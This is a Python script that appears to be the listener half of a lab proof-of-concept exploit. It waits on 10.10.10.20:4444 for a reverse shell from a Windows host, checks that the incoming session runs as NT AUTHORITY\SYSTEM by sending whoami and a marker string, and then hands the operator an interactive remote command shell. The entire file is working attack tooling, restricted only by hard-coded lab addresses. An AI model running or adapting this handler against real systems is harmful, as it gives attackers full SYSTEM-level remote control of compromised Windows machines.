#!/usr/bin/env python3
"""Accept the fixed lab reverse shell and keep the SYSTEM session interactive."""

from __future__ import annotations

import socket
import select
import sys
from datetime import datetime, timezone


BIND_IP = "10.10.10.20"
BIND_PORT = 4444
EXPECTED_SOURCE_IP = "10.10.10.30"
READY_MARKER = b"stage=child_ready"
ERROR_MARKER = b"error="
VERIFY_MARKER = b"__POC_SYSTEM_READY__"
VERIFY_COMMANDS = (
    b"@echo off\r\n"
    b"whoami\r\n"
    b"echo " + VERIFY_MARKER + b"\r\n"
)


def receive_until(connection: socket.socket, markers: tuple[bytes, ...]) -> bytes:
    output = bytearray()
    while not any(marker in output for marker in markers):
        try:
            chunk = connection.recv(4096)
        except (socket.timeout, ConnectionResetError):
            break
        if not chunk:
            break
        output.extend(chunk)
    return bytes(output)


def interactive_session(connection: socket.socket) -> None:
    connection.settimeout(None)
    print("interactive=ready; type Windows commands, or type exit to close")
    while True:
        readable, _, _ = select.select([connection, sys.stdin], [], [])

        if connection in readable:
            try:
                data = connection.recv(4096)
            except ConnectionResetError:
                print("\npeer reset the connection", file=sys.stderr)
                return
            if not data:
                print("\npeer closed the connection")
                return
            print(data.decode("cp949", errors="replace"), end="", flush=True)

        if sys.stdin in readable:
            line = sys.stdin.readline()
            if line == "":
                return
            command = line.rstrip("\r\n").encode("cp949", errors="replace")
            connection.sendall(command + b"\r\n")


def main() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((BIND_IP, BIND_PORT))
        listener.listen(1)
        listener.settimeout(180)
        print(f"listening on {BIND_IP}:{BIND_PORT} for {EXPECTED_SOURCE_IP}")

        connection, address = listener.accept()
        with connection:
            timestamp = datetime.now(timezone.utc).astimezone().isoformat()
            print(f"connected_at={timestamp}")
            print(f"source={address[0]}:{address[1]}")
            if address[0] != EXPECTED_SOURCE_IP:
                print("unexpected source; closing without commands", file=sys.stderr)
                return 2

            connection.settimeout(15)
            stage_output = receive_until(connection, (READY_MARKER, ERROR_MARKER))
            print("----- payload stage -----")
            print(stage_output.decode("ascii", errors="replace").rstrip())
            print("-------------------------")

            if ERROR_MARKER in stage_output:
                print("payload reported an error", file=sys.stderr)
                return 1
            if READY_MARKER not in stage_output:
                print("cmd.exe readiness was not observed", file=sys.stderr)
                return 1

            connection.sendall(VERIFY_COMMANDS)
            verification = receive_until(connection, (VERIFY_MARKER,))
            output = verification.decode("cp949", errors="replace")
            print("----- reverse-shell verification -----")
            print(output.rstrip())
            print("--------------------------------------")

            normalized = output.replace("/", "\\").lower()
            if "nt authority\\system" not in normalized:
                print("SYSTEM identity was not observed", file=sys.stderr)
                return 1
            if VERIFY_MARKER.decode().lower() not in normalized:
                print("verification marker was not observed", file=sys.stderr)
                return 1

            print("verified_reverse_shell=NT AUTHORITY\\SYSTEM")
            try:
                interactive_session(connection)
            except KeyboardInterrupt:
                print("\nclosing interactive session")
                try:
                    connection.sendall(b"exit\r\n")
                except OSError:
                    pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
